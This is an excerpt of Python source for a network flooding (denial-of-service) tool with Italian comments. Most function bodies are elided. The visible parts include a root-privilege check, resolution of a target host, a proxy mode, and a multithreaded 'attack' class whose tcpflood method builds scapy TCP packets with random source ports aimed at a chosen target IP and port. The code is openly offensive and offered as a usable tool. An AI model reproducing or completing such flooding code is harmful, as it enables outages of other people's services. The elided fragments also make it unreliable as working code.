import socket, socks, threading, random, re, urllib.request, os
...
if os.name == "nt":
	print ("TCP/UDP FLOOD ARE NOT SUPPORTED ON WINDOWS SYSTEMS. YOU MUST USE HTTP FLOOD.")
else:
...
def floodmode():
	...
	if choice1 == "0":
		...
		try:
			if os.getuid() != 0: # Controlla se il programma e' stato eseguito come root.
...
def floodport():
	...
	if port in portlist:
		...
		print ("You mistyped, try again.")
		floodport()
	try: # ho messo il try perche' a volte il gethostbyname fa capricci
		iptarget = socket.gethostbyname(url2)
	except:
		iptarget = socket.gethostbyname(url2)
	proxymode()	
...
class attack(threading.Thread): # la classe del multithreading
	...
	def tcpflood(self): # funzione per tcp flood classico
		...
		p = bytes(IP(dst=str(iptarget))/TCP(sport=RandShort(), dport=int(port))/data) # costruzione pacchetto tcp + data
		go.wait()
